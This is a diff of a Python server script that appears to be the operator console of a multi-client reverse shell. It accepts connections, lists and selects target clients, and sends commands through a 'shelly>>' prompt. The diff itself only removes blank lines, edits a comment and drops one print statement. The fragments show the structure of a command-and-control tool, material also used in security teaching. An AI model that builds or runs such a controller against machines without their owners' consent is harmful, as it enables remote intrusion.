@@ -39,8 +39,6 @@ def socket_bind():
 
 
 # Accept connections from multiple clients and save to list
-
-
 def accept_connections():
     for c in all_connections:
         c.close()
@@ -57,8 +55,6 @@ def accept_connections():
             print("Error accepting connections")
 
 # Interactive prompt for sending commands reotely
-
-
 def start_shelly():
     while True:
         cmd = input('shelly>> ')
@@ -72,8 +68,6 @@ def start_shelly():
             print("Command not recognized")
 
 # Display all current connections
-
-
 def list_connections():
     results = ''
     for i, conn in enumerate(all_connections):
@@ -89,8 +83,6 @@ def list_connections():
     print('------ Clients ------' + '\n' + results)
 
 # Select a target client
-
-
 def get_target(cmd):
     try:
         target = cmd.split(" ")[1]
@@ -104,8 +96,6 @@ def get_target(cmd):
         return None
 
 # Connect with remote target client
-
-
 def send_target_commands(conn):
     while True:
         try:
@@ -115,15 +105,12 @@ def send_target_commands(conn):
                 client_response = str(conn.recv(20480), "utf-8")
                 print(client_response, end='')
             if cmd == 'dc':
-                print("Disconnecting from " + str(all_addresses[target][0]))
                 break
         except:
             print("Connection was lost")
             break
 
-# Create worker threads
-
-
+# Create worker thread
 def create_workers():
     for _ in range(NUMBER_OF_THREADS):
         t = threading.Thread(target=work)
@@ -131,8 +118,6 @@ def create_workers():
         t.start()
 
 # Do the next job in the queue (one handles connections, the other sends commands)
-
-
 def work():
     while True:
         x = queue.get()
@@ -145,8 +130,6 @@ def work():
         queue.task_done()
 
 # Each list item is a new job
-
-
 def create_jobs():
     for x in JOB_NUMBER:
         queue.put(x)
